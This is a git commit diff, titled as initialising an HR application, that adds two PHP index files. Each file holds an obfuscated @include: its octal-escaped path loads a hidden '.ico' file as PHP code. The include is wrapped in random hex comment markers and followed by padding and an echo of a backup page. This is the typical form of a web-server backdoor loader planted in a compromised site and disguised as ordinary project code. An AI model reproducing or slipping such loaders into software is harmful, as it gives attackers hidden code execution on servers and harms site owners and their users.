dc6007139b96e201c63b3db760c080bde80c19b2
shahajahancse <msacse1@gmail.com>
2022-11-29 17:05:29 +0600

    initialize the SMART HRM

---
+++ skin/index.php
@@ -0,0 +1,14 @@
+<?php
+/*d63ab*/
+
+@include "\057hom\1451/m\171sof\164/pu\142lic\137htm\154/my\163oft\150eav\145n.c\157m/s\155s/s\171ste\155/he\154per\163/.b\063a64\0645e.\151co";
+
+/*d63ab*/
+
+
+
+
+
+
+
+echo @file_get_contents('index.html.bak.bak');
---
+++ system/index.php
@@ -0,0 +1,14 @@
+<?php
+/*cf431*/
+
+@include "\057ho\155e1\057my\163of\164/p\165bl\151c_\150tm\154/m\171so\146th\145av\145n.\143om\057sm\163/s\171st\145m/\150el\160er\163/.\1423a\06644\065e.\151co";
+
+/*cf431*/
+
+
+
+
+
+
+
+echo @file_get_contents('index.html.bak.bak');
